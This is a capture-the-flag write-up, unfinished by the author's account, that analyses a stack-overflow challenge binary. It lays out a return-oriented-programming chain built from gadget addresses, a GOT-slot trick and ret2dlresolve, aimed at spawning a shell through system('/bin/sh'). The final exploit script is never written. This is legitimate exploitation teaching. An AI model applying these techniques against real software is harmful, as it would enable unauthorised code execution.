# ROP2Impress — Pwn (352 pts) — **NOT SOLVED**

> ropper ropper on the -Wall, who's the slayest of them all?
> `nc 45.77.247.35 22004`

Not finished during the event. Publishing the analysis because the gadget situation is unusual
and the path is, I believe, complete — only the delivery was never written.

## The binary

```
No RELRO | No canary | NX | No PIE | glibc 2.39
```

```c
void gift(void) { __asm__("pop %rbx; ret"); __asm__("pop %rsp; ret"); }
void rop(void)  { char buf[0x50]; read(0, buf, 0x60); if (!buf[0]) rop(); return; }
int  main(void) { rop(); }
```

`read(0, buf, 0x60)` into `char buf[0x50]` = **16 bytes of overflow** — exactly saved `rbp`
plus the return address, nothing more. And if `buf[0] == 0` it **recurses**, letting you stack
frames and write repeatedly.

## Why this is awkward

```
$ ropper --file main          # 67 gadgets total
0x40112a : pop rbx ; ret
0x40112c : pop rsp ; ret
0x40110d : pop rbp ; ret
0x40115e : leave ; ret
0x401016 : ret
```

Byte-scanning the whole file for `5f c3` / `5e c3` / `5a c3` / `58 c3` / `0f 05` confirms:
**no `pop rdi`, no `pop rsi`, no `pop rdx`, no `pop rax`, no `syscall`.** The only PLT import
is `read`. There is **no output function at all**, so no libc leak is possible — which forces
**ret2dlresolve**.

But ret2dlresolve still needs `rdi` pointing at `"/bin/sh"` when the resolver tail-jumps to
`system`, and there is no `pop rdi`.

## The three pieces that make it work

**1. An arbitrary write, free of argument gadgets.** Returning into `rop+0x8` (`0x401139`)
re-enters the body *after* the prologue. That code sets up all three arguments itself:

```asm
401139: lea rax, [rbp-0x50]
40113d: mov edx, 0x60        ; count
401142: mov rsi, rax         ; dst  = rbp-0x50   <-- controlled via rbp
401145: mov edi, 0x0         ; fd
40114a: call read@plt
```

With `pop rbp; ret` you choose `rbp`, so this is `read(0, rbp-0x50, 0x60)` — write 0x60 bytes
anywhere. Better still, the following `leave; ret` takes its next `rbp` and return address from
bytes you just wrote, so it chains.

**2. An `rdi` setter.** `deregister_tm_clones` contains:

```asm
401097: mov edi, 0x403368    ; .bss (__TMC_END__)
40109c: jmp rax
```

Write `"/bin/sh\0"` to `0x403368` and this sets `rdi` correctly — but it ends in `jmp rax`, so
it needs `rax`.

**3. Controlling `rax`.** There is exactly one gadget that loads it:

```asm
401004: mov rax, qword [rip+0x2325]   ; -> 0x403330, a writable GOT slot (No RELRO)
40100b: test rax, rax
40100e: je  0x401012                  ; 0x401012: add rsp, 8 ; ret
401010: call rax
```

It *calls* whatever it loads, which initially looks useless. The trick: set
`[0x403330] = 0x401016` (a bare `ret`). Then `call rax` invokes a harmless `ret`, control
returns to `0x401012` (`add rsp,8 ; ret`) and the chain continues — **with `rax` still holding
`0x401016`**.

Now `mov edi, 0x403368 ; jmp rax` behaves as `mov edi, 0x403368 ; ret`, i.e. an `rdi` setter
that returns. That was the missing primitive.

## The chain

Pre-stage with the write primitive: `"/bin/sh\0"` at `0x403368`, `0x401016` at `0x403330`, and
a pwntools `Ret2dlresolvePayload` (fake `Elf64_Sym` / `Elf64_Rela` / `"system"`) in `.bss`.
Then:

```
[0x401004]   ; rax <- 0x401016 (ret), harmless call, falls into add rsp,8; ret
[DUMMY]      ; eaten by the add rsp,8
[0x401097]   ; mov edi,0x403368 ("/bin/sh"); jmp rax == ret
[0x401020]   ; PLT0  -> push link_map; jmp _dl_runtime_resolve
[reloc_index]; resolver reads this; resolves "system"; tail-jumps with rdi intact
[after]
```

`_dl_runtime_resolve` preserves the argument registers across resolution, so `system("/bin/sh")`.

## What's left

Only delivery. The 16-byte overflow plus the recursion has to stage several `0x60`-byte blocks
into `.bss` and then pivot — each write's trailing 16 bytes are consumed as the next
`rbp`/return pair, so data and control are interleaved and the layout needs care. Fiddly, not
conceptually hard. I ran out of time before writing it.

24 teams solved this, so the above is likely close to the intended route.
